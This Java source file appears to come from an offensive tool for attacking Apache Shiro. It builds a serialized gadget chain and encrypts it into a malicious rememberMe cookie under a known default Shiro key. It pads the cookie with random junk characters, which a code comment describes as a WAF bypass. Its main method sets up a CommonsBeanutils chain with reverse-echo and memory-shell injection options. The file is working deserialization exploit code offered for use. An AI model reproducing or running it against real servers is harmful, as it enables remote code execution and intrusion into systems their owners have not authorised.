package com.summersec.attack.deser.frame;

import com.summersec.attack.Encrypt.CbcEncrypt;
import com.summersec.attack.Encrypt.GcmEncrypt;
import com.summersec.attack.Encrypt.ShiroGCM;
import com.summersec.attack.core.AttackService;
import com.summersec.attack.deser.payloads.ObjectPayload;
import com.summersec.attack.deser.util.Gadgets;
import com.summersec.attack.deser.util.GadgetsK;
import com.summersec.attack.utils.AesUtil;
import com.mchange.v2.ser.SerializableUtils;
import java.util.Arrays;
import java.util.List;
import javax.xml.bind.DatatypeConverter;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.crypto.CipherService;
import org.apache.shiro.util.ByteSource;
import java.util.Random;




public class Shiro implements FramePayload {
    public Shiro() {
    }

    public static String insertSpecialChars(String str) {
        int strLength = str.length();
        Random random = new Random();

        // 生成三个不重复的随机位置
        int position1 = random.nextInt(strLength);
        int position2 = random.nextInt(strLength);
        int position3 = random.nextInt(strLength);

        // 确保三个位置不重复
        while (position2 == position1) {
            position2 = random.nextInt(strLength);
        }
        while (position3 == position1 || position3 == position2) {
            position3 = random.nextInt(strLength);
        }

        // 生成随机特殊符号
        String specialChar = String.valueOf("@@*");

        // 在三个随机位置插入特殊符号
        StringBuilder sb = new StringBuilder(str);
        sb.insert(position1, specialChar);
        sb.insert(position2, specialChar);
        sb.insert(position3, specialChar);
        return sb.toString();
    }

    @Override
    public String sendpayload(Object ChainObject) throws Exception {
        return null;
    }

    @Override
    public String sendpayload(Object chainObject, String shiroKeyWord, String key) throws Exception {
        byte[] serpayload = SerializableUtils.toByteArray(chainObject);
        byte[] bkey = DatatypeConverter.parseBase64Binary(key);
        byte[] encryptpayload = null;
//        byte[] encryptpayload;
        if (AttackService.aesGcmCipherType == 1) {
//            CipherService cipherService = new AesCipherService();
//            ByteSource byteSource = cipherService.encrypt(serpayload, bkey);
//            encryptpayload = byteSource.getBytes();
//            GcmEncrypt gcmEncrypt = new GcmEncrypt();
            ShiroGCM shiroGCM = new ShiroGCM();
            String byteSource = shiroGCM.encrypt(key,serpayload);
//            String byteSource = gcmEncrypt.encrypt(key, serpayload);
//            encryptpayload = byteSource.getBytes();
            byteSource = insertSpecialChars(byteSource);
            System.out.println(shiroKeyWord + "=" + byteSource);
            return shiroKeyWord + "=" + byteSource;

        } else {
            System.out.println("sendPayload");
//            encryptpayload = AesUtil.encrypt(serpayload, bkey);
            CbcEncrypt cbcEncrypt = new CbcEncrypt();
            String byteSource = cbcEncrypt.encrypt(key, serpayload);
            byteSource = insertSpecialChars(byteSource);
            System.out.println(byteSource);
            System.out.println(shiroKeyWord + "=" + byteSource);
            return shiroKeyWord + "=" + byteSource;
        }

//增加绕waf的方法，暂不开启。by @by3 @liuwa
        //return shiroKeyWord +  "=" +"...." + DatatypeConverter.printBase64Binary(encryptpayload);
//		return shiroKeyWord + "=" + DatatypeConverter.printBase64Binary(encryptpayload);

    }
//    @Override
//    public String sendpayload(Object chainObject, String shiroKeyWord, String key) throws Exception {
//        byte[] serpayload = SerializableUtils.toByteArray(chainObject);
//        byte[] bkey = DatatypeConverter.parseBase64Binary(key);
//        byte[] encryptpayload = null;
//    //        byte[] encryptpayload;
//        if (AttackService.aesGcmCipherType == 1) {
//    //            CipherService cipherService = new AesCipherService();
//    //            ByteSource byteSource = cipherService.encrypt(serpayload, bkey);
//    //            encryptpayload = byteSource.getBytes();
//            GcmEncrypt gcmEncrypt = new GcmEncrypt();
//            String byteSource = gcmEncrypt.encrypt(key,serpayload);
//    //            encryptpayload = byteSource.getBytes();
//            System.out.println(shiroKeyWord + "=" + byteSource);
//            return shiroKeyWord + "=" + byteSource;
//
//        } else {
//            encryptpayload = AesUtil.encrypt(serpayload, bkey);
//        }
//
//        return shiroKeyWord + "=" + DatatypeConverter.printBase64Binary(encryptpayload);
//    }

    public static void main(String[] args) throws Exception {
        Class<? extends ObjectPayload> gadgetClazz = (Class<? extends ObjectPayload>) Utils.getPayloadClass("CommonsBeanutilsAttrCompare");
        ObjectPayload<?> gadgetpayload = (ObjectPayload) gadgetClazz.newInstance();
        List<String> echoList = Arrays.asList("TomcatEcho", "Tomcat1Echo", "InjectMemTool", "SpringEcho", "NoEcho", "ReverseEcho", "TomcatHeaderEcho", "InjectMemTool");
        String option = "ReverseEcho";
        Object template = null;
        Object chainObject = null;
        if (echoList.contains(option)) {
            template = Gadgets.createTemplatesImpl(option);
        } else {
            template = GadgetsK.createTemplatesTomcatEcho();
        }

        Shiro shiro = new Shiro();
        if (template != null) {
            chainObject = gadgetpayload.getObject(template);
            AttackService.aesGcmCipherType = 1;
            String sendpayload = shiro.sendpayload(chainObject, "rememberMe", "4AvVhmFLUs0KTA3Kprsdag==");
            System.out.println(sendpayload);
        }

    }
}



